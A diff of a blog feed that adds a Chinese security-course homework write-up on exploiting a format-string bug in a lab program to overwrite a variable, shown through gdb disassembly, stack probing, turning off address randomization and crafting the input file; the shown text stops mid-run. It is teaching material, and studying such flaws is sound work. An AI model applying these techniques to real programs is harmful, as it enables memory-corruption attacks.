@@ -24,7 +24,259 @@
         <pubDate>Mon, 18 Dec 2023 11:28:18 +0800</pubDate>
         
         <guid>https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A8/</guid>
-        <description></description>
+        <description>&lt;p&gt;题目：在32位的ubuntu16.04运行环境下，对格式化漏洞程序vul_formatstr2.c，参照
+12.2.4的方法，说明如何修改程序，将变量B的值改成0x5678CDEF。&lt;/p&gt;
+&lt;p&gt;在Ubuntu 64位系统上，使用以下命令来安装gcc多架构编译器和32位库：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo apt-get install gcc-multilib libc6-dev-i386&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在编译C程序时，使用&lt;code&gt;-m32&lt;/code&gt;选项来生成32位的可执行文件。例如：
+&lt;code&gt;gcc -m32 -o v2 vul_formatstr2.c&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;azureuser@MyServer:~/hw$ gdb v2&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000122d &amp;lt;+0&amp;gt;:     endbr32 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001231 &amp;lt;+4&amp;gt;:     push   %ebp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001232 &amp;lt;+5&amp;gt;:     mov    %esp,%ebp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001234 &amp;lt;+7&amp;gt;:     push   %ebx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001235 &amp;lt;+8&amp;gt;:     sub    &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;x414,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000123b &amp;lt;+14&amp;gt;:    call   0x1130 &amp;lt;__x86.get_pc_thunk.bx&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001240 &amp;lt;+19&amp;gt;:    add    &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;x2d8c,%ebx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001246 &amp;lt;+25&amp;gt;:    mov    %gs:0x14,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000124c &amp;lt;+31&amp;gt;:    mov    %eax,-0xc&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000124f &amp;lt;+34&amp;gt;:    xor    %eax,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001251 &amp;lt;+36&amp;gt;:    movl   &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;x3435,-0x418&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000125b &amp;lt;+46&amp;gt;:    movl   &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;x5657,-0x414&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001265 &amp;lt;+56&amp;gt;:    movl   &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;x7879,-0x410&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000126f &amp;lt;+66&amp;gt;:    lea    -0x410&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001275 &amp;lt;+72&amp;gt;:    push   %eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001276 &amp;lt;+73&amp;gt;:    lea    -0x414&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000127c &amp;lt;+79&amp;gt;:    push   %eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000127d &amp;lt;+80&amp;gt;:    lea    -0x418&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001283 &amp;lt;+86&amp;gt;:    push   %eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001284 &amp;lt;+87&amp;gt;:    lea    -0x1fc4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000128a &amp;lt;+93&amp;gt;:    push   %eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000128b &amp;lt;+94&amp;gt;:    call   0x10a0 &amp;lt;printf@plt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001290 &amp;lt;+99&amp;gt;:    add    &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;x10,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001293 &amp;lt;+102&amp;gt;:   mov    -0x410&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%ecx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001299 &amp;lt;+108&amp;gt;:   mov    -0x414&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%edx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000129f &amp;lt;+114&amp;gt;:   mov    -0x418&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012a5 &amp;lt;+120&amp;gt;:   push   %ecx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012a6 &amp;lt;+121&amp;gt;:   push   %edx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012a7 &amp;lt;+122&amp;gt;:   push   %eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012a8 &amp;lt;+123&amp;gt;:   lea    -0x1fab&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012ae &amp;lt;+129&amp;gt;:   push   %eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012af &amp;lt;+130&amp;gt;:   call   0x10a0 &amp;lt;printf@plt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012b4 &amp;lt;+135&amp;gt;:   add    &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;x10,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012b7 &amp;lt;+138&amp;gt;:   sub    &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;xc,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012ba &amp;lt;+141&amp;gt;:   lea    -0x1f94&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012c0 &amp;lt;+147&amp;gt;:   push   %eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012c1 &amp;lt;+148&amp;gt;:   call   0x10c0 &amp;lt;puts@plt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012c6 &amp;lt;+153&amp;gt;:   add    &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;x10,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012c9 &amp;lt;+156&amp;gt;:   sub    &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;x8,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012cc &amp;lt;+159&amp;gt;:   lea    -0x40c&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012d2 &amp;lt;+165&amp;gt;:   push   %eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012d3 &amp;lt;+166&amp;gt;:   lea    -0x1f7d&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012d9 &amp;lt;+172&amp;gt;:   push   %eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012da &amp;lt;+173&amp;gt;:   call   0x10e0 &amp;lt;__isoc99_scanf@plt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012df &amp;lt;+178&amp;gt;:   add    &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;x10,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012e2 &amp;lt;+181&amp;gt;:   sub    &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;xc,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012e5 &amp;lt;+184&amp;gt;:   lea    -0x40c&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012eb &amp;lt;+190&amp;gt;:   push   %eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012ec &amp;lt;+191&amp;gt;:   call   0x10a0 &amp;lt;printf@plt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012f1 &amp;lt;+196&amp;gt;:   add    &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;x10,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012f4 &amp;lt;+199&amp;gt;:   sub    &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;xc,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012f7 &amp;lt;+202&amp;gt;:   lea    -0x1f7a&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012fd &amp;lt;+208&amp;gt;:   push   %eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x000012fe &amp;lt;+209&amp;gt;:   call   0x10c0 &amp;lt;puts@plt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001303 &amp;lt;+214&amp;gt;:   add    &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;x10,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001306 &amp;lt;+217&amp;gt;:   mov    -0x410&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%ecx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000130c &amp;lt;+223&amp;gt;:   mov    -0x414&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%edx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001312 &amp;lt;+229&amp;gt;:   mov    -0x418&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001318 &amp;lt;+235&amp;gt;:   push   %ecx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001319 &amp;lt;+236&amp;gt;:   push   %edx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000131a &amp;lt;+237&amp;gt;:   push   %eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000131b &amp;lt;+238&amp;gt;:   lea    -0x1f78&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebx&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001321 &amp;lt;+244&amp;gt;:   push   %eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001322 &amp;lt;+245&amp;gt;:   call   0x10a0 &amp;lt;printf@plt&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001327 &amp;lt;+250&amp;gt;:   add    &lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt;x10,%esp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000132a &amp;lt;+253&amp;gt;:   nop
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000132b &amp;lt;+254&amp;gt;:   mov    -0xc&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000132e &amp;lt;+257&amp;gt;:   xor    %gs:0x14,%eax
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001335 &amp;lt;+264&amp;gt;:   je     0x133c &amp;lt;formatstr_vul+271&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001337 &amp;lt;+266&amp;gt;:   call   0x13f0 &amp;lt;__stack_chk_fail_local&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000133c &amp;lt;+271&amp;gt;:   mov    -0x4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;%ebp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,%ebx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x0000133f &amp;lt;+274&amp;gt;:   leave  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   0x00001340 &amp;lt;+275&amp;gt;:   ret    
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;End of assembler dump.
+&lt;code&gt;(gdb) b *(formatstr_vul+191)&lt;/code&gt;
+Breakpoint 1 at 0x12ec
+(gdb) r
+Starting program: /home/azureuser/hw/v2
+&lt;font color=&#34;#ff0000&#34;&gt;&amp;amp;A=0xffffcde0   &amp;amp;B=0xffffcde4   C=0xffffcde8.&lt;/font&gt;
+A=0x3435        B=0x5657        C=0x7879.
+Please enter a string:
+ABCD%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.&lt;/p&gt;
+&lt;p&gt;Breakpoint 1, 0x565562ec in formatstr_vul ()
+(gdb) x/x $esp
+0xffffcdd0:     0xffffcdec
+(gdb) p (0xbfffcdec-0xbfffcdd0)/4
+$1 = 7&lt;/p&gt;
+&lt;p&gt;因此，user_input的首地址为0xffffcdec，位于栈顶开始的第7个(4字
+节）单元。&lt;/p&gt;
+&lt;p&gt;关闭地址随机化机制:
+&lt;code&gt;sudo sysctl -w kernel.randomize_va_space=0&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;根据上面可知 &lt;strong&gt;&amp;amp;B=0xffffcde4=4294954468&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;azureuser@MyServer:~/hw$ ./read2file
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Please enter an address.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;4294954468&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Please enter the format string:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%08x.%08x.%08x.%08x.%08x.%08x.%08x.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;The string length is &lt;span class=&#34;m&#34;&gt;39&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;azureuser@MyServer:~/hw$ ./v2 &amp;lt; mystring
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xffffce30   &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xffffce34   &lt;span class=&#34;nv&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0xffffce38.
